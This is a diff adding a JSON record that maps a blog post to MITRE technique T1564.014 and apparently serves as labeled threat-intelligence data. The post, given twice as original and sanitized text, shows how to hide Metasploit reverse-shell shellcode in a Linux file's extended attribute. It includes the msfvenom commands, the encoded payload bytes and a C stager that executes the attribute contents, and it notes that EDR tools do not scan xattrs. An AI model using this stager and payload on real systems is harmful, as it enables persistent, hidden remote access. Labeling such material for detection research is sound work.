@@ -1,0 +1,63 @@
+{
+  "original_txt": "Establishing persistence using extended attributes on Linux\nFinding a place to store your backdoor/beacon/malware data can be tricky. Some ways that come to mind: creating new files, modifying existing ones or storing it in memory via /dev/shm\n.\nMalware on Windows has abused NTFS file attributes to store malicious data or binaries instead of metadata for a long while. I had the idea to experiment with the same on Linux while conducting EDR evaluation testing at work. Extended attributes (xattrs) were added to Linux in 2002. As of 2024, they are not commonly used by user-space Linux programs.\nThe Linux kernel allows extended attribute names to have up to 255 bytes and values of up to 64 KiB, but Ext4 and Btrfs might impose smaller limits, requiring extended attributes to be within a “filesystem block” (usually 4 KiB). All major Linux file systems including Ext4, Btrfs, ZFS, and XFS support extended attributes. This makes xattrs a good candidate for establishing persistence on a Linux system.\nPoC stager that abuses extended attributes\nLet’s create a simple but easily detectable shellcode that spawns a reverse TCP shell using Metasploit.\nsiren@eek14:~/ > msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\\x00' -f bash\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nFound 3 compatible encoders\nAttempting to encode payload with 1 iterations of x64/xor\nx64/xor succeeded with size 119 (iteration=0)\nx64/xor chosen with final size 119\nPayload size: 119 bytes\nFinal size of bash file: 533 bytes\nexport buf=\\\n$'\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef'\\\n$'\\xff\\xff\\xff\\x48\\xbb\\x87\\x22\\xe0\\xd6\\x4b\\x28\\x0d\\x73\\x48'\\\n$'\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xed\\x0b\\xb8'\\\n$'\\x4f\\x21\\x2a\\x52\\x19\\x86\\x7c\\xef\\xd3\\x03\\xbf\\x45\\xca\\x85'\\\n$'\\x22\\xf5\\x65\\x34\\x28\\x0d\\x72\\xd6\\x6a\\x69\\x30\\x21\\x38\\x57'\\\n$'\\x19\\xad\\x7a\\xef\\xd3\\x21\\x2b\\x53\\x3b\\x78\\xec\\x8a\\xf7\\x13'\\\n$'\\x27\\x08\\x06\\x71\\x48\\xdb\\x8e\\xd2\\x60\\xb6\\x5c\\xe5\\x4b\\x8e'\\\n$'\\xf9\\x38\\x40\\x0d\\x20\\xcf\\xab\\x07\\x84\\x1c\\x60\\x84\\x95\\x88'\\\n$'\\x27\\xe0\\xd6\\x4b\\x28\\x0d\\x73'\nNow, we need to store the bytes in the extended attributes of a file (a directory is a file too!).\nsiren@eek14:~/ > setfattr --name=user.1337 --value=\"$buf\" .bash_history\nNow the contents of the shellcode are stored in the user extended attribute called “1337” of the file .bash_history.\nsiren@eek14:~/ > getfattr --encoding=hex --dump .bash_history\n# file: .bash_history\nuser.1337=0x4831c94881e9f6ffffff488d05efffffff48bb8722e0d64b280d7348315827482df8ffffffe2f4ed0bb84f212a5219867cefd303bf45ca8522f56534280d72d66a693021385719ad7aefd3212b533b78ec8af7132708067148db8ed260b65ce54b8ef938400d20cfab07841c6084958827e0d64b280d73\nWe can read and execute the extended file attribute which launches the reverse shell.\n#include <stdio.h>\n#include <sys/xattr.h>\n// gcc -fno-stack-protector -z execstack stager.c\nint main() {\nconst char *file_path = \"/home/siren/.bash_history\";\nconst char *attr_name = \"user.1337\";\nchar attr_value[119];\nssize_t ret;\nret = getxattr(file_path, attr_name, attr_value, sizeof(attr_value));\nif (ret == -1) {\nperror(\"getxattr\");\nreturn 1;\n}\nint (*func)();\nfunc = (int (*)()) attr_value;\n(int)(*func)();\n}\nSo far, so simple. One way to achieve further complexity and obfuscation is by splitting the shellcode across different files. I have yet to see an EDR program in 2024 that scans extended attributes for malware in Linux, so I didn’t feel the need to do this.\nDetection results\nExtended file attributes are not kept when a file is uploaded through a web browser. In order to preserve them, I created a tar archive.\nsiren@eek14:~/ > tar --xattrs -cvf bashhistory.tar .bash_history\nFor comparison, I created the same shellcode but in ELF format and uploaded it.\nsiren@eek14:~/ > msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\\x00' -f elf -o delivery\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nFound 3 compatible encoders\nAttempting to encode payload with 1 iterations of x64/xor\nx64/xor succeeded with size 119 (iteration=0)\nx64/xor chosen with final size 119\nPayload size: 119 bytes\nFinal size of elf file: 239 bytes\nSaved as: delivery\nGotchas\nBy default, extended attributes are not preserved by tar, cp, rsync, and other similar programs, see #Preserving extended attributes on Arch Wiki.",
+  "sanitized_txt": "Establishing persistence using extended attributes on Linux Finding a place to store your backdoor/beacon/malware data can be tricky. Some ways that come to mind: creating new files, modifying existing ones or storing it in memory via /dev/shm .\nMalware on Windows has abused NTFS file attributes to store malicious data or binaries instead of metadata for a long while. I had the idea to experiment with the same on Linux while conducting EDR evaluation testing at work. Extended attributes (xattrs) were added to Linux in 2002. As of 2024, they are not commonly used by user-space Linux programs.\nThe Linux kernel allows extended attribute names to have up to 255 bytes and values of up to 64 KiB, but Ext4 and Btrfs might impose smaller limits, requiring extended attributes to be within a “filesystem block” (usually 4 KiB). All major Linux file systems including Ext4, Btrfs, ZFS, and XFS support extended attributes. This makes xattrs a good candidate for establishing persistence on a Linux system.\nPoC stager that abuses extended attributes Let’s create a simple but easily detectable shellcode that spawns a reverse TCP shell using Metasploit.\nsiren@eek14:~/ > msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\\x00' -f bash [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload Found 3 compatible encoders Attempting to encode payload with 1 iterations of x64/xor x64/xor succeeded with size 119 (iteration=0) x64/xor chosen with final size 119 Payload size: 119 bytes Final size of bash file: 533 bytes export buf=\\ $'\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef'\\ $'\\xff\\xff\\xff\\x48\\xbb\\x87\\x22\\xe0\\xd6\\x4b\\x28\\x0d\\x73\\x48'\\ $'\\x31\\x58\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xed\\x0b\\xb8'\\ $'\\x4f\\x21\\x2a\\x52\\x19\\x86\\x7c\\xef\\xd3\\x03\\xbf\\x45\\xca\\x85'\\ $'\\x22\\xf5\\x65\\x34\\x28\\x0d\\x72\\xd6\\x6a\\x69\\x30\\x21\\x38\\x57'\\ $'\\x19\\xad\\x7a\\xef\\xd3\\x21\\x2b\\x53\\x3b\\x78\\xec\\x8a\\xf7\\x13'\\ $'\\x27\\x08\\x06\\x71\\x48\\xdb\\x8e\\xd2\\x60\\xb6\\x5c\\xe5\\x4b\\x8e'\\ $'\\xf9\\x38\\x40\\x0d\\x20\\xcf\\xab\\x07\\x84\\x1c\\x60\\x84\\x95\\x88'\\ $'\\x27\\xe0\\xd6\\x4b\\x28\\x0d\\x73' Now, we need to store the bytes in the extended attributes of a file (a directory is a file too!).\nsiren@eek14:~/ > setfattr --name=user.1337 --value=\"$buf\" .bash_history Now the contents of the shellcode are stored in the user extended attribute called “1337” of the file .bash_history.\nsiren@eek14:~/ > getfattr --encoding=hex --dump .bash_history # file: .bash_history user.1337=0x4831c94881e9f6ffffff488d05efffffff48bb8722e0d64b280d7348315827482df8ffffffe2f4ed0bb84f212a5219867cefd303bf45ca8522f56534280d72d66a693021385719ad7aefd3212b533b78ec8af7132708067148db8ed260b65ce54b8ef938400d20cfab07841c6084958827e0d64b280d73 We can read and execute the extended file attribute which launches the reverse shell.\n#include <stdio.h> #include <sys/xattr.h> // gcc -fno-stack-protector -z execstack stager.c int main() { const char *file_path = \"/home/siren/.bash_history\";\nconst char *attr_name = \"user.1337\";\nchar attr_value[119];\nssize_t ret;\nret = getxattr(file_path, attr_name, attr_value, sizeof(attr_value));\nif (ret == -1) { perror(\"getxattr\");\nreturn 1;\n} int (*func)();\nfunc = (int (*)()) attr_value;\n(int)(*func)();\n} So far, so simple. One way to achieve further complexity and obfuscation is by splitting the shellcode across different files. I have yet to see an EDR program in 2024 that scans extended attributes for malware in Linux, so I didn’t feel the need to do this.\nDetection results Extended file attributes are not kept when a file is uploaded through a web browser. In order to preserve them, I created a tar archive.\nsiren@eek14:~/ > tar --xattrs -cvf bashhistory.tar .bash_history For comparison, I created the same shellcode but in ELF format and uploaded it.\nsiren@eek14:~/ > msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555 -b '\\x00' -f elf -o delivery [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload Found 3 compatible encoders Attempting to encode payload with 1 iterations of x64/xor x64/xor succeeded with size 119 (iteration=0) x64/xor chosen with final size 119 Payload size: 119 bytes Final size of elf file: 239 bytes Saved as: delivery Gotchas By default, extended attributes are not preserved by tar, cp, rsync, and other similar programs, see #Preserving extended attributes on Arch Wiki.",
+  "ID_list": [
+    "T1564.014"
+  ],
+  "Name_list": [
+    "NTFS File Attributes",
+    "Persistence"
+  ],
+  "TTP_sentences": {
+    "T1564.014": [
+      {
+        "sentence": "Establishing persistence using extended attributes on Linux Finding a place to store your backdoor/beacon/malware data can be tricky.",
+        "score": 0.573
+      },
+      {
+        "sentence": "Some ways that come to mind: creating new files, modifying existing ones or storing it in memory via /dev/shm .",
+        "score": 0.4496
+      },
+      {
+        "sentence": "Malware on Windows has abused NTFS file attributes to store malicious data or binaries instead of metadata for a long while.",
+        "score": 0.6922
+      },
+      {
+        "sentence": "I had the idea to experiment with the same on Linux while conducting EDR evaluation testing at work.",
+        "score": 0.3299
+      },
+      {
+        "sentence": "Extended attributes (xattrs) were added to Linux in 2002.",
+        "score": 0.7239
+      },
+      {
+        "sentence": "As of 2024, they are not commonly used by user-space Linux programs.",
+        "score": 0.429
+      },
+      {
+        "sentence": "The Linux kernel allows extended attribute names to have up to 255 bytes and values of up to 64 KiB, but Ext4 and Btrfs might impose smaller limits, requiring extended attributes to be within a “filesystem block” (usually 4 KiB).",
+        "score": 0.674
+      },
+      {
+        "sentence": "All major Linux file systems including Ext4, Btrfs, ZFS, and XFS support extended attributes.",
+        "score": 0.643
+      },
+      {
+        "sentence": "This makes xattrs a good candidate for establishing persistence on a Linux system.",
+        "score": 0.5684
+      },
+      {
+        "sentence": "One way to achieve further complexity and obfuscation is by splitting the shellcode across different files.",
+        "score": 0.4008
+      },
+      {
+        "sentence": "I have yet to see an EDR program in 2024 that scans extended attributes for malware in Linux, so I didn’t feel the need to do this.",
+        "score": 0.5343
+      },
+      {
+        "sentence": "Detection results Extended file attributes are not kept when a file is uploaded through a web browser.",
+        "score": 0.4858
+      }
+    ]
+  }
+}
